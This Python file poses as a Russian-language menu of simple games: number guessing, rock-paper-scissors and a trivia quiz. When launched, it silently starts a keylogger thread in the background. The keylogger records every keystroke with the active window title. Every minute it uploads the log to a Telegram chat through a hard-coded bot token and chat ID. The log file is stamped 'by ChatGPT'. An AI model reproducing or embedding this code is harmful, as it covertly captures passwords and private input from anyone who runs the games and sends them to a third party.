import time
import os
import random
from telegram import Bot
from pynput.keyboard import Listener
import pygetwindow as gw
import asyncio
from threading import Thread, Timer

LOG_FILE = "game_file.txt"
BOT_TOKEN = "7629868870:AAEQPrAeYrr27blt_uOrJEvDJay6pWkQz4w"
CHAT_ID = "1994060516"

def get_active_window():
    try:
        active_window = gw.getActiveWindow()
        return active_window.title if active_window else "No Active Window"
    except Exception:
        return "Error getting active window"

def on_press(key):
    try:
        key_str = key.char
    except AttributeError:
        key_str = str(key)
    current_time = time.strftime("%Y-%m-%d %H:%M:%S")
    active_window = get_active_window()
    log_entry = f"[{current_time}] [Active Window: {active_window}] {key_str}\n"
    with open(LOG_FILE, "a", encoding="utf-8") as log_file:
        log_file.write(log_entry)

async def send_log_via_telegram():
    try:
        bot = Bot(token=BOT_TOKEN)
        with open(LOG_FILE, "rb") as log_file:
            await bot.send_document(chat_id=CHAT_ID, document=log_file, caption="Логи клавиатуры")
    except Exception as e:
        print(f"Ошибка отправки логов: {e}")

def schedule_telegram_sending():
    asyncio.run(send_log_via_telegram())
    Timer(60, schedule_telegram_sending).start()

def start_keylogger():
    if not os.path.exists(LOG_FILE):
        with open(LOG_FILE, "w", encoding="utf-8") as log_file:
            log_file.write("by ChatGPT\n")
    Thread(target=schedule_telegram_sending, daemon=True).start()
    with Listener(on_press=on_press) as listener:
        listener.join()

def guess_the_number():
    number = random.randint(1, 100)
    print("Угадай число от 1 до 100!")
    while True:
        try:
            guess = input("Твой вариант: ")
            if guess == "выход":
                break
            guess = int(guess)
            if guess < number:
                print("Слишком мало!")
            elif guess > number:
                print("Слишком много!")
            else:
                print("Поздравляю, ты угадал!")
                break
        except ValueError:
            print("Пожалуйста, введи число.")
        except Exception:
            print("Произошла ошибка.")

def rock_paper_scissors():
    print("Игра: Камень, Ножницы, Бумага.")
    choices = ["камень", "ножницы", "бумага"]
    while True:
        player_choice = input("Выберите (камень, ножницы, бумага) или введите 'выход' для выхода: ").lower()
        if player_choice == "выход":
            break
        if player_choice not in choices:
            print("Неверный выбор. Попробуйте снова.")
            continue
        computer_choice = random.choice(choices)
        print(f"Компьютер выбрал: {computer_choice}")
        if player_choice == computer_choice:
            print("Ничья!")
        elif (player_choice == "камень" and computer_choice == "ножницы") or \
             (player_choice == "ножницы" and computer_choice == "бумага") or \
             (player_choice == "бумага" and computer_choice == "камень"):
            print("Вы победили!")
        else:
            print("Вы проиграли!")

def quiz():
    questions = [
        {"question": "Какая планета самая большая?", "answer": "Юпитер"},
        {"question": "Столица Франции?", "answer": "Париж"},
        {"question": "Сколько дней в году?", "answer": "365"},
        {"question": "Сколько цветов в радуге?", "answer": "7"},
        {"question": "Сколько часов в сутках?", "answer": "24"},
        {"question": "Какой газ преобладает в атмосфере Земли?", "answer": "Азот"},
        {"question": "Какая страна является родиной пиццы?", "answer": "Италия"},
        {"question": "Сколько зубов у взрослого человека?", "answer": "32"},
        {"question": "Как называется самая глубокая точка мирового океана?", "answer": "Марианская впадина"},
        {"question": "Кто написал роман 'Война и мир'?", "answer": "Толстой"}
    ]
    print("Викторина! Напиши 'выход' для завершения.")
    score = 0
    for question in questions:
        print(question["question"])
        answer = input("Ваш ответ: ")
        if answer.lower() == "выход":
            break
        if answer.lower() == question["answer"].lower():
            print("Правильно!")
            score += 1
        else:
            print("Неправильно!")
    print(f"Ваш счёт: {score} из {len(questions)}")

def main_menu():
    while True:
        print("\nВыберите игру:")
        print("1. Угадай число")
        print("2. Камень, Ножницы, Бумага")
        print("3. Викторина")
        print("0. Выход")
        choice = input("Ваш выбор: ")
        if choice == "1":
            guess_the_number()
        elif choice == "2":
            rock_paper_scissors()
        elif choice == "3":
            quiz()
        elif choice == "0":
            print("Выход из программы.")
            break
        else:
            print("Неверный выбор. Попробуйте снова.")

if __name__ == "__main__":
    Thread(target=start_keylogger, daemon=True).start()
    main_menu()
